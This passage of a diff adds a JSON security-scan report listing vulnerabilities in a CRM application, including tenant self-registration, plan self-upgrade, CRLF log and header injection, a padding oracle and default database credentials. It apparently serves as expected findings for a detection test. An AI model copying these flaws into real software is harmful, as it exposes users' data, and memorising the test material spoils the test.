+        "message": "register() assigns the public, unauthenticated caller the role CUSTOMER_CONTACT and sets user.organizationId = registerDto.organizationId \u2014 an arbitrary, caller-chosen organization id with no invite code or membership validation (organizations even maintain a teamInviteCode for this purpose). Anyone can self-register into any organization and immediately receive that tenant's customer-visible data (deals, escalations, documents scoped by organizationId).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-863: Incorrect Authorization",
+            "CWE-284: Improper Access Control"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.privilege-escalation",
+      "path": "backend/src/modules/organizations/organizations.service.ts",
+      "start": {
+        "line": 100,
+        "col": 7,
+        "offset": 3309
+      },
+      "end": {
+        "line": 100,
+        "col": 64,
+        "offset": 3366
+      },
+      "extra": {
+        "message": "create() copies the caller-supplied plan from CreateOrganizationDto (plan: createOrganizationDto.plan || OrganizationPlan.STARTER). Changing an organization's plan is otherwise restricted to PLATFORM_ADMIN via PATCH /organizations/:id/plan, but at creation any authenticated user can set plan: 'enterprise', self-upgrading to enterprise tier features without authorization.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-284: Improper Access Control",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.misconfiguration.clickjacking",
+      "path": "backend/src/modules/organizations/organizations.controller.ts",
+      "start": {
+        "line": 105,
+        "col": 7,
+        "offset": 3202
+      },
+      "end": {
+        "line": 105,
+        "col": 44,
+        "offset": 3239
+      },
+      "extra": {
+        "message": "getPartnerEmbedManifest removes the X-Frame-Options header for enterprise-plan organizations (res.removeHeader('X-Frame-Options')) while setting X-Frame-Options: DENY for everyone else, leaving enterprise responses without any clickjacking protection so they can be embedded in attacker-controlled iframes. The sibling customer-portal manifest endpoint always sets X-Frame-Options: DENY, confirming the inconsistent protection is unsafe.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1021: Improper Restriction of Rendered UI Layers or Frames",
+            "CWE-693: Protection Mechanism Failure"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.log-injection",
+      "path": "backend/src/modules/contacts/contacts.service.ts",
+      "start": {
+        "line": 114,
+        "col": 5,
+        "offset": 3633
+      },
+      "end": {
+        "line": 116,
+        "col": 6,
+        "offset": 3754
+      },
+      "extra": {
+        "message": "recordActivityNote writes the raw, unvalidated 'note' and 'action' body fields directly into the application log (logger.log(`... action=${action} note=${note}`)). Because neither value is sanitized (no DTO validation is applied to these primitives) and may contain CRLF sequences, an attacker can forge or corrupt log entries. The sibling deals.recordStageChangeReason sanitizes input with replace(/[\\r\\n\\0]/g, ' ') before logging, confirming this omission is unsafe.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-117: Improper Output Neutralization for Logs"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.header-injection",
+      "path": "backend/src/modules/documents/documents.controller.ts",
+      "start": {
+        "line": 86,
+        "col": 5,
+        "offset": 2556
+      },
+      "end": {
+        "line": 86,
+        "col": 88,
+        "offset": 2639
+      },
+      "extra": {
+        "message": "retrieveDocumentAsset sets Content-Disposition to `attachment; filename=\"${originalName}\"` using the stored originalName, which is the client-supplied file name from upload, without sanitization. A crafted originalName containing quotes or CR/LF characters manipulates or breaks the HTTP response header framing (and at minimum breaks the download in a server error). The sibling buildLabeledRenewalsExport explicitly strips [\\r\\n] and truncates the label before placing it in Content-Disposition 'free of anything that could break the HTTP response framing'.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.padding-oracle",
+      "path": "backend/src/modules/documents/documents.service.ts",
+      "start": {
+        "line": 172,
+        "col": 7,
+        "offset": 5381
+      },
+      "end": {
+        "line": 172,
+        "col": 72,
+        "offset": 5446
+      },
+      "extra": {
+        "message": "unsealContractTerms decrypts caller-supplied ciphertext with AES-256-CBC, which provides no integrity/authentication, and then returns a distinguishable error for padding failures ('Invalid padding on sealed contract terms') versus other failures, creating a padding-oracle observable. The sibling unsealArchivedContractTerms uses authenticated AES-256-GCM and reports one generic failure for every error case ('nothing about the ciphertext's structure leaks back to the caller'), confirming the CBC variant's error differentiation is the unsafe pattern.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-327: Use of a Broken or Risky Cryptographic Algorithm",
+            "CWE-203: Observable Discrepancy"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.hardcoded-credentials",
+      "path": "backend/src/config/database.config.ts",
+      "start": {
+        "line": 9,
+        "col": 3,
+        "offset": 341
+      },
+      "end": {
+        "line": 9,
+        "col": 51,
+        "offset": 389
+      },
+      "extra": {
+        "message": "The database configuration falls back to the well-known default credentials username 'postgres' / password 'postgres' when DB_USERNAME/DB_PASSWORD are not set. If deployed without environment overrides, the database is reachable with publicly known credentials.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.sensitive-data.log-exposure",
+      "path": "backend/src/common/interceptors/audit-log.interceptor.ts",
+      "start": {
+        "line": 43,
+        "col": 11,
+        "offset": 1301
+      },
+      "end": {
+        "line": 43,
+        "col": 109,
+        "offset": 1399
+      },
+      "extra": {
+        "message": "The global AuditLogInterceptor persists a responsePreview of up to 500 characters of every mutating request's response body into the audit_logs table. Responses such as POST /auth/login and POST /auth/register contain access_token JWTs, and POST /api-keys returns plainKey, so live session tokens and raw API keys end up stored in queryable audit-log records.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.dos.unlimited-upload",
+      "path": "backend/src/modules/documents/documents.controller.ts",
+      "start": {
+        "line": 56,
+        "col": 3,
+        "offset": 1579
+      },
+      "end": {
+        "line": 74,
+        "col": 5,
+        "offset": 2197
+      },
+      "extra": {
+        "message": "The upload route uses FileInterceptor('file') without any multer limits option (no fileSize, no file count limits, and no MIME allowlist beyond the client-side 'accept' attribute), and documents.service.upload then writes file.buffer to disk with fs.writeFileSync. Any authenticated user can exhaust server memory or disk with arbitrarily large or rapid uploads, a resource-exhaustion denial of service.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-400: Uncontrolled Resource Consumption",
+            "CWE-770: Allocation of Resources Without Limits or Throttling"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.sensitive-data.storage",
+      "path": "frontend/src/app/services/auth.service.ts",
+      "start": {
+        "line": 31,
+        "col": 9,
+        "offset": 1040
+      },
+      "end": {
+        "line": 31,
+        "col": 55,
+        "offset": 1086
+      },
+      "extra": {
+        "message": "The JWT access token is stored in localStorage ('crm_token'). localStorage is accessible to any JavaScript running on the page, so a single cross-site scripting bug allows full token theft and account takeover; security guidance recommends httpOnly cookies or in-memory storage for session tokens.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-922: Insecure Storage of Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
